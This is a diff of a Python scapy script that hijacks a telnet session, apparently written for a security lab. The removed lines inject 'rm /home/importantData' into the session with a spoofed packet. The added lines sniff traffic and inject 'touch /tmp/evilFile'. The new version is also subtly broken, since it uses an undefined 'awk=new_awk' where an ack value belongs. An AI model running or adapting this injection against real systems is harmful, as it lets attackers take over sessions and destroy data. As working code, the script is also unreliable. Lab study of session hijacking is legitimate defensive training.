@@ -1,10 +1,20 @@
 #!/usr/bin/python3
 from scapy.all import *
 
-print("Hijack")
+def spoof(pkt):
+  o_ip = pkt[IP]
+  o_tcp = pkt[TCP]
+  
+  new_seq = o_tcp.seq + 10
+  new_ack = o_tcp.ack + 1
+  ip = IP(src="10.0.2.6", dst="10.0.2.7")
+  tcp = TCP(sport=o_tcp.sport, dport=23, flags="A", seq=new_seq, awk=new_awk)
+  data = "\n touch /tmp/evilFile\n"
+  pkt = ip/tcp/data
+  ls(pkt)
+  send(pkt, verbose=0)
+  quit()
 
-ip = IP(src="10.0.2.6", dst="10.0.2.7")
-tcp = TCP(sport=59896, dport=23, flags="A", seq=111, ack=111)
-data = "\n rm /home/importantData"
-pkt = ip/tcp/data
-send(pkt, verbose=0)
+myFilter = 'tcp and src host 10.0.2.6 and dst host 10.0.2.7 and dst port 23'
+
+sniff(filter=myFilter, prn=spoof)
